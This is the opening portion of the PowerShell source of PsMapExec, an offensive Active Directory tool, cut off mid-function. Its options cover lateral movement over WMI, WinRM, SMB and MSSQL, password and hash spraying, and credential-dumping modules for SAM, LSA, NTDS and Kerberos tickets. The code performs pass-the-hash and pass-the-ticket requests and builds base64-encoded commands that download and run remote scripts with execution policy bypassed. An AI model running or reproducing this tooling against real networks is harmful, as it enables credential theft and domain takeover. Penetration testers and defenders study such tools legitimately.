Function PsMapExec {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Command = '',

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Targets = '',

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Domain = "$env:USERDNSDOMAIN",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Username = "",

        [Parameter(Mandatory = $True, ValueFromPipeline = $true)]
        [String]$Method = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Module = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Hash = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Password = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$UserDomain = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$LocalFileServer = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [int]$Threads = 30,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$Force,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$LocalAuth,
    
        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$CurrentUser = $True,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$SuccessOnly,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$ShowOutput,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$Ticket = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [Switch]$AccountAsPassword,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [Switch]$EmptyPassword,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [int]$Port = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [Switch]$NoParse,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$SprayHash = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [String]$SprayPassword = "",

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$NoBanner,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [string]$DomainController,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [int]$Timeout = 3000,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$Flush,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$Scramble,

        [Parameter(Mandatory = $False, ValueFromPipeline = $true)]
        [switch]$Rainbow
    )



    $startTime = Get-Date
    Set-Variable MaximumHistoryCount 32767

    # Set the targets variable if not provided when spraying
    if ($Method -eq "Spray" -and $Targets -eq "") {
        $Targets = "all"
    }


    ################################################################################################################
    ###################################### Banner and version information ##########################################
    ################################################################################################################

    $Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 

Github  : https://github.com/The-Viper-One
Version : 0.4.7")

    if (!$NoBanner) {
        Write-Output $Banner
    }

    function Test-DomainJoinStatus {
        if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
            return $true
        }
        else {
            return $false
        }
    }

    $DomainJoined = Test-DomainJoinStatus

    if ($DomainJoined) {
        if ($NoBanner) { Write-Output "" }
        Write-Output "Domain  : Yes"
    }
    elseif (!$DomainJoined) {
        if ($NoBanner) { Write-Output "" }
        Write-Output "Domain  : No"
    }

    if ($Flush) {
        $global:DomainAdmins = $null
        $global:EnterpriseAdmins = $null
        $global:ServerOperators = $null
        $global:AccountOperators = $null
        $FQDNDomainPlusDomainAdmins = $null
        $FQDNDomainPlusEnterpriseAdmins = $null
        $FQDNDomainPlusServerOperators = $null
        $FQDNDomainPlusAccountOperators = $null

        # Target Variables
        $Global:TargetsServers = $null
        $Global:TargetsWorkstations = $null
        $Global:TargetsDomainControllers = $null
        $Global:TargetsAll = $null

    }

    # If no targets have been provided
    if (-not $Targets -and $Method -ne "Spray") {
    
        Write-Host
        Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
        Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
        return
    }

    if ($Targets -match "^\*+$") {
    
        Write-Host
        Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
        Write-Host "The target cannot consist only of asterisks. Please specify a more specific target."
        return
    }

    if ($Targets -match "^\*.*|.*\*$") { Write-Host "Targets : Wildcard matching" }
    elseif ($Targets -eq "Workstations") { Write-Host "Targets : Workstations" }
    elseif ($Targets -eq "Servers") { Write-Host "Targets : Servers" }
    elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") { Write-Host "Targets : Domain Controllers" }
    elseif ($Targets -eq "All" -or $Targets -eq "Everything") { Write-Host "Targets : All" }
    elseif ($Targets -notmatch "\*") { $IsFile = Test-Path $Targets ; if ($IsFile) { Write-Host "Targets : File ($Targets)" } }

    function IsIPAddressOrCIDR {
        param ([string]$Target)

        # Regular expressions for IP address and CIDR notation
        $ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
        $cidrPattern = '^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$'

        # Check if the target matches either the IP address or CIDR pattern
        return $Target -match $ipPattern -or $Target -match $cidrPattern
    }


    # Check if Targets is a valid IP or CIDR
    if (IsIPAddressOrCIDR $Targets) {
        Write-Host
        Write-Error "IP Address not yet supported"
        continue
    }
    else { $IPAddress = $False }

    ################################################################################################################
    ####################################### Some logic based checking ##############################################
    ################################################################################################################
    if ($Method -ne "") {
        switch ($Method) {
            "All" {}
            "WinRM" {}
            "MSSQL" {}
            "SMB" {}
            "WMI" {}
            "RDP" {}
            "GenRelayList" {}
            "SessionHunter" {}
            "Spray" {}
            "VNC" {}

            default {
            
                Write-Host
                Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                Write-Host "Invalid Method specified"
                Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
                return
            }
        }
    }

    if ($Module -ne "") {
        switch ($Module) {
            "Amnesiac" {}
            "ConsoleHistory" {}
            "Files" {}
            "KerbDump" {}
            "eKeys" {}
            "LogonPasswords" {}
            "LSA" {}
            "NTDS" {}
            "SAM" {}
            "Test" {}
            "Tickets" {}

            default {
            
                Write-Host
                Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                Write-Host "Invalid Module specified"
                Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                Write-Host "Specify either: Files, ConsoleHistory, KerbDump, eKeys, LogonPasswords, LSA, NTDS, SAM, Tickets, Amnesiac"
                return
            }
        }
    }

    if ($Module -eq "NTDS" -and ($Targets -in @("Everything", "Workstations", "all", "Servers"))) {
    
        Write-Host
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline
        Write-Host "You must specify a single domain controller (e.g., DC01.Security.local) or 'DC', 'DCs', 'Domain Controllers' as a target when using the NTDS module"
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline
        Write-Host "For example: -Targets DCs, -Targets DC01.Security.local"
        return
    }


    if ($Threads -lt 1 -or -not [int]::TryParse($Threads, [ref]0)) {
        
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 1"
        return
    }

    if ($Threads -gt 100) {
        
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be than 100. This will likely cause results to be missed."
        return
    }



    if (!$DomainJoined) { $CurrentUser = $False }

    if ($Domain -eq "" -and $DomainJoined -eq $False) {
    
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-host "This system appears to be a non-domain joined system. You must specify a target Domain ""-Domain Security.local"""
        return
    }

    if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") { $CurrentUser = $False }
    if ($Method -eq "Spray" -and $DomainJoined -eq $True) { $CurrentUser = $True }
    if ($Method -eq "GenRelayList") { $CurrentUser = $True }
    if ($Method -eq "RDP") { $CurrentUser = $True }
    if ($Method -eq "MSSQL") { $CurrentUser = $True }



    if ($Method -eq "" -and !$SessionHunter -and !$Spray) {
        
        Write-Host
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
    }


    if ($Method -eq "RDP") {
        if ($Hash -ne "") {
        
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Hash authentication not currently supported with RDP"
            return
        }
    
        if ($Ticket -ne "") {
        
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Ticket authentication not currently supported with RDP"
            return
        }
    
        if ($Username -eq "" -or $Password -eq "") {
        
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "-Username and -Password parameters required when using the method RDP"
            return
        }
    }


    if ($Method -eq "VNC") {
        if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
            $CurrentUser = $True
        
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host " Method VNC does not support authentication material, it simply checks if No Auth is enabled."
            Write-Host
            Start-sleep -Seconds 5
        }
    } 

    if ($Method -eq "Spray") {

        if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq "") {

            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "We need something to spray"
            Write-Host
            Write-host "PsMapExec -Method Spray -SprayPassword [Password]"
            Write-host "PsMapExec -Method Spray -SprayHash [Hash]"
            Write-host "PsMapExec -Method Spray -AccountAsPassword"
            Write-host "PsMapExec -Method Spray -EmptyPassword"
            return

        }

        if ($SprayHash -ne "" -and $SprayPassword -ne "") {

            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Hash and Password detected"
            return

        }

        if ($EmptyPassword -and $SprayHash -ne "" -or ($EmptyPassword -and $SprayPassword -ne "")) {

            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Password or hash value provided with -EmptyPassword"
            return

        }

        if ($AccountAsPassword -and $SprayHash -ne "" -or ($AccountAsPassword -and $SprayPassword -ne "")) {

            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Password or hash value provided with -EmptyPassword"
            return

        }

        if ($AccountAsPassword -and $EmptyPassword) {

            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
            return
    
        }
    }

    if ($Method -eq "WinRM" -and !$DomainJoined) {

        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Be aware, using WinRM from a non-domain joined system typically does not work"

        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "This is default and expected behaviour. This system will need to be configured as a trusted host on the remote system to allow access"
    }

    if ($Method -eq "MSSQL" -and $LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
    
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Looks like you are missing either -Username or -Password"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
        return
    }

    if ($Method -eq "MSSQL" -and !$LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
    
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Looks like you are missing either -Username or -Password"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "You can append -LocalAuth if you wish to authenticate with a -Username and -Password as SQL Authentication"
        return
    }

    if ($Rainbow) {
        if ($Module -ne "Sam" -and $Module -ne "LogonPasswords" -and $Module -ne "NTDS") {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch -Rainbow is only compatible with the Modules 'LogonPasswords', 'NTDS', and 'SAM'"
            return
        }
    }


    # Check if this conflicts with anything
    if ($LocalAuth) { $CurrentUser = $True }

    # Check script modules, fix this later
    $InvokerTicketsLoaded = Get-Command -Name "Invoke-rTickets" -ErrorAction "SilentlyContinue"
    ################################################################################################################
    ######################################### External Script variables ############################################
    ################################################################################################################

    $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
    $KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
    $NTDSURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NTDS.ps1"

    # Fix later, needs to be coded into Amnesiac logic portion
    $Amn3s1acURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1"

    # Check if $LocalFileServer is not NULL
    if (![string]::IsNullOrEmpty($LocalFileServer)) {
        # Regular expression pattern to validate an IP address
        $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'

        if ($LocalFileServer -match $ipRegex) {
            # Update URLs to use the provided local file server's IP address
            $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
            $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
        }
        else {
            # If $LocalFileServer is not a valid IP address, show an error message and return
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "The provided value '$LocalFileServer' is not a valid IP address."
            return
        }
    }




    ################################################################################################################
    ########################################### Current User Ticket ################################################
    ################################################################################################################

    # Check if the current user is an administrator, used for ticket functions
    $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    $Klist = -not (& klist | Select-String -Pattern "Cached Tickets: \(0\)")
    if (!$klist) { Write-verbose "No Kerberos tickets in cache" }  

    function GetCurrentUserTicket {

        Invoke-Expression -Command $Global:rbs
    
        if ($Method -ne "RDP") {
            if ($Method -ne "MSSQL") {
                if ($DomainJoined) {
                    if ($Klist) {
                        try {
                            Write-Verbose "Attempting to obtain current user ticket"
                            if ($DomainController -ne "") {
                                $BaseTicket = Invoke-rTickets send /domain:$domain /dc:$DomainController /nowrap| Out-String
                            }
                            else {
                                $BaseTicket = Invoke-rTickets send /nowrap /domain:$domain | Out-string
                            }
                            $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                        }
                        catch {
                            try {
                                if (!$CheckAdmin) {
                                    $BaseTicket = Invoke-rTickets get /service:krbtgt /nowrap | Out-String
                                    $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()

                                    if ($Global:OriginalUserTicket -notlike "doI*") {
                                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                        Write-Host "Unable to retrieve any Kerberos tickets"
                                        break
                                    }
                                }
                                elseif ($CheckAdmin) {
                                    $BaseTicket = Invoke-rTickets get /service:krbtgt /username:$env:username /nowrap | Out-String
                                    $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()

                                    if ($Global:OriginalUserTicket -notlike "doI*") {
                                        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                                        break
                                    }
                                }
                            }
                            catch {
                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                                Write-Host "Unable to retrieve any Kerberos tickets"
                                break
                            }
                        }
                    }
                }
            }
        }
    }

    ################################################################################################################
    ################################################# Function: RestoreTicket ######################################
    ################################################################################################################
    Function RestoreTicket {
        if (!$CurrentUser) {
            if ($Klist -eq $False) {
                Write-Verbose "Clearing tickets as no tickets in original cache"
                klist purge | Out-Null
                return
            }

            if ($Method -ne "GenRelayList") {
                Write-Verbose "Restoring Ticket"
                klist purge | Out-Null
                Start-sleep -Milliseconds 100

                klist purge | Out-Null

                if ($DomainController -ne "") { Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /dc:$DomainController | Out-Null }
                else { Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket | Out-Null }
                

                try {
                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction "SilentlyContinue"
                    $DomainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
                    $PDC = $domainContext.PdcRoleOwner.Name
                    Write-Verbose "Creating LDAP TGS for $PDC"
                }
                catch {
                    Write-Verbose "Error creating ticket to $PDC"
                }
            }
        }
    }

    ################################################################################################################
    ########################################### Ticket processing ##################################################
    ################################################################################################################

    function ProcessTicket {
    
        Write-Host
    
        if ($Method -ne "RDP") {
        
            # Check if a ticket has been provided
            if ($Ticket -ne "") {
                if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
                    $Ticket = Get-Content -Path $Ticket -Raw
                }

                $ProvidedTicket = Invoke-rTickets explain /ticket:$Ticket
            
                # Check if an error has occurred
                if ($ProvidedTicket -like "*/ticket:X*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Invalid ticket provided"
                    break
                }
            
                elseif ($ProvidedTicket -like "*Asn1.AsnException: value overflow*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Invalid ticket provided"
                    break
                }

                # Use regular expressions to extract ticket information
                $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketRealm = [regex]::Match($ProvidedTicket, "UserDomain\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketExpiry = [regex]::Match($ProvidedTicket, "End\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketType = [regex]::Match($ProvidedTicket, "NameService\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

                # Display the extracted information
                Write-Host
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Supplied Ticket Details"

                if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
                if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }

                Write-Host "    - UserName : $TicketUsername"
                Write-Host "    - Realm    : $TicketRealm"
                Write-Host "    - Expires  : $TicketExpiry"

                # Attempt to inject the ticket into the current session
                if ($DomainController -ne "") {
                    $InjectTicket = Invoke-rTickets ptt /ticket:$Ticket /domain:$Domain /dc:$DomainController
                }
                else {
                    $InjectTicket = Invoke-rTickets ptt /ticket:$Ticket /domain:$Domain
                }

                if ($InjectTicket -like "*Error 1398*") {
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "Ticket expired"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }
            }
            elseif ($Password -ne "") {
                klist purge | Out-Null

                if ($UserDomain -ne "") {
                    if ($DomainController -ne "") {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt
                    }
                    else {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt

                    }
                }
                elseif ($UserDomain -eq "") {
                    if ($DomainController -ne "") {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt
                    }
                    else {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt
                    }
                }

                Write-Verbose $AskPassword

                if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect password or username"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*Unhandled rTickets exception:*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect password or username"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Try with a AES256 hash instead"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }
            } 
        
            elseif ($Hash -ne "") {
                
                if ($Hash.Length -eq 32) {
                    klist purge | Out-Null
                    Write-Verbose "Type Hash:32"

                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                    if ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                        }
                    }

                    Write-Verbose $AskRC4

                    if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        klist purge | Out-Null
                        RestoreTicket
                        
                        break
                    }
                
                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try with a AES256 hash instead"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                }
                elseif ($Hash.Length -eq 64) {
                    klist purge | Out-Null
                    Write-Verbose "Type Hash:64"

                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                        }
                        else {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt
                        }
                    }
                    elseif ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                        }
                        else {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt
                        }
                    }

                    Write-Verbose $Ask256

                    if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($Ask256 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($Ask256 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                
                
                }
                elseif ($Hash.Length -eq 65) {
                    $colonCount = ($Hash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                    
                    if ($colonCount -ne 1) {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
                        Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
                        break
                    }
                
                    $Hash = $Hash.Split(':')[1]

                    klist purge | Out-Null
                    Write-Verbose "Type Hash:65"
                
                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                    if ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                
                    Write-Verbose $AskRC4
                
                    if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }
                
                    if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        klist purge | Out-Null
                        RestoreTicket
                        
                        break
                    }
                
                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try with a AES256 hash instead of NTLM"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                }
                else {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                    Write-Host 
                    Write-Host
                
                    break
                }

            }
        }
    }


    ################################################################################################################
    ############################################## Load Amnesiac ###################################################
    ################################################################################################################

    if ($Module -eq "Amnesiac") {
        if ([string]::IsNullOrEmpty($Global:AmnesiacPID) -or (Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -eq $null) {
            $Global:PN = $null
            $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''
        
            if (!$Global:SID) {
                $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
            }
        
            $finalcommand = "iex(new-object net.webclient).downloadstring('$Amn3s1acURL');Amnesiac -ScanMode -GlobalPipeName $PN"
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
            Invoke-Expression -Command $Global:rbs

            if (!$CurrentUser) {
                Write-Verbose "Starting Amnesiac with impersonation"
                GetCurrentUserTicket
                $process = Invoke-rTickets startonlynet /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /username:$env:Username /password:Fakepass /domain:$Domain /show /ptt /ticket:$Global:OriginalUserTicket
                $pattern = "\sProcessID\s+:\s+(\d+)"
            
                # Find the created process ID
                $match = [regex]::Match($process, $pattern)
                if ($match.Success) {
                    $Global:AmnesiacPID = $match.Groups[1].Value
                } 
            }
        
            if ($CurrentUser) {
                Write-Verbose "Starting Amnesiac without impersonation"
                $process = Start-Process cmd.exe -ArgumentList "/c powershell.exe -ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
                $Global:AmnesiacPID = $process.Id
            }
        }
        else {
            Write-Verbose "Amnesiac is already running"
            if ($Scramble) { $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join '' }
            elseif ((Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -ne $null) {
                $Global:PN = $Global:PN
            }
            else {
                $Global:AmnesiacPID = $null
            }
        }
    }


    ################################################################################################################
    ######################################### Console Display variables ############################################
    ################################################################################################################

    function Display-ComputerStatus {
        param (
            [string]$ComputerName,
